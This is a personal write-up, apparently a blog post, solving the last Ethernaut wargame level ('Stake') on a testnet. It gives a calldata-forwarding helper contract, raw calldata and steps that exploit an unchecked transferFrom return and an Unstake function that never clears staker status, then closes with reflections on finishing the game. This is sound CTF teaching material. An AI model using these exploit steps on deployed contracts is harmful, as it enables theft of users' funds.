# Many requirements, many calls.

This level has a few requirements to pass:

```
The Stake contract's ETH balance has to be greater than 0.
totalStaked must be greater than the Stake contract's ETH balance.
You must be a staker.
Your staked balance must be 0.
```

It requires a few calls not just from your EOA wallet, but possibly from contract as well. Another EOA would also do the trick, but I have another `DoDumbCall` contract set up for this.

The older `DoDumbCall` would have done the trick, if only I had made the function `payable`. Alas, we're all mortals after all.

```solidity
contract DoDumbCall {
    function doDumbCall(address _contract, bytes memory _data) public {
        (bool success,) = _contract.call(_data);
        if (!success) {
            revert();
        }
    }

    function doDumbCallWithMoney(address _contract, bytes memory _data) public payable {
        (bool success,) = _contract.call{value: msg.value}(_data);
        if (!success) {
            revert();
        }
    }
}
```

This contract is deployed [here](https://sepolia.etherscan.io/address/0x5A74E2160c1EaCa22869cCe05F869b7cFe929EcE#code) for posterity.

# The steps

1. We call `Stake::StakeEth` via `DoDumbCall::doDumbCallWithMoney` with calldata `0x78e7ed2f` to get the Eth balance of `Stake` up.
2. We `approve` `Stake` for an insane amount of tokens. `WETH` address is publicly available on `Stake`, so we call that contract via `DoDumbCall::doDumbCall`. The calldata is `0x095ea7b30000000000000000000000003ce315ba311c9f594251511fa7624664622cbe48000000000000000000000000000000000000000000000000016345785d8a0000`
3. We call `Stake::StakeWETH` with that insane amount. The calldata is `0x6e35c740000000000000000000000000000000000000000000000000016345785d8a0000`.
   `StakeWETH` has a flaw, in that it doesn't check for the successful call of `transferFrom`. It gets the `bool`, but doesn't `revert` if the `bool` is `false`. `totalStaked` gets updated as well. We take advantage of this.

```solidity
(bool transfered,) = WETH.call(abi.encodeWithSelector(0x23b872dd, msg.sender, address(this), amount));
Stakers[msg.sender] = true;
return transfered;
```

4. From our EOA, we call `Stake::StakeEth` to become a staker.
5. From our EOA, we call `Stake::Unstake` with whatever `amount` we just staked. The contract logic only updates the user's staked amount, but doesn't update the staker to be `false` is the total amount staked is zero.

```solidity
function Unstake(uint256 amount) public returns (bool) {
        require(UserStake[msg.sender] >= amount, "Don't be greedy");
        UserStake[msg.sender] -= amount;
        totalStaked -= amount;
        (bool success,) = payable(msg.sender).call{value: amount}("");
        return success;
    }
```

And that's it.

# The End of Ethernaut

I kinda feel sad, to be honest. I've been playing it on and off, got busy with other stuff in between, procrastinated, had lazy days, sad days, had all those human follies. But it's over now.

What I most struggled with was MagicNumber, where I had to try for multiple days to figure out the answer. Now, after having learned Huff, it's a walk in the park. It's as Robin Sharma said in a video: everything you now find easy, you once found hard.

So there's hope for the things that you now find hard.

Also, that mystery of the human condition: at the end of it all, what I'm grateful for is the struggle, not the reward.
